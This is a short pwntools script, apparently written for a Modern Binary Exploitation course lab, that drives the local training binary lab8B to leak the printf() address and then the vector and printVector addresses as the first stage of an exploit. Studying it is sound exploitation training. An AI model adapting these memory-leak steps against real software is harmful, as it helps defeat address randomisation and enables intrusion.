# Based on https://github.com/ewilded/MBE-snippets/blob/master/LAB7C/exploit.py
from pwn import *

settings = {
    # Path to binary
    "binary"        : "/levels/lab08/lab8B",
}
# Exploit here
def exploit():
    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","3")
    p.sendlineafter("Which vector? ","1")
	# First, we print the first vector without initializing it with anything, this will leak the printf() address.
	
    leak = p.recv()
    printf_addr = u32(leak[0x0:0x4])
    print("Leaked printf() address: ",hex(printf_addr))
	
    # Now we initiate the vector 1 with data, then we will print it. This way we will leak the printVector() address.
    p.sendline("1")
    p.sendline("1")
    p.sendline("a")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")

    # Now we print it to leak the printVector() address.
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","3")
    p.sendlineafter("Which vector? ","1")
    v1_addr = int(p.recvline().split(" ")[1].strip(),16)
    print_vector_addr = int(p.recvline().split(" ")[2].strip(),16)
    print("Leaked v1() address: ",hex(v1_addr))
    print("Leaked printFunc() address: ",hex(print_vector_addr))
    p.sendline("0") # quit
    p.recv()
    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = process(binary.path,stdin=PTY)
    exploit()
